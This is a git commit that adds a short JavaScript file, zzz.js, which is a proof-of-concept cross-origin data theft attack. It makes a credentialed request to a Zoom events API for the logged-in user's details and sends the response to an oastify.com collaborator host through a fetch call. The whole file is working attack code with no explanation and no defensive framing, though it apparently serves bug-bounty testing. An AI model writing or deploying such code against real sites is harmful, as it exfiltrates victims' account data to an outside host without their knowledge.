9fad8561335984d1914db677091bf952a7a1bfe5
monixxxx <92028136+monixxxx@users.noreply.github.com>
2023-07-29 23:34:52 +0300

    Create zzz.js

---
+++ zzz.js
@@ -0,0 +1,11 @@
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('GET','https://events.zoom.us/api/v1/e/getCurrentUser',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    fetch(('https://s92luzs7awz2niagondy9mc1csij6du2.oastify.com/?xxx='+this.responseText))
+    .then(res => res.json())
+    .then(data => console.log(data))
+};
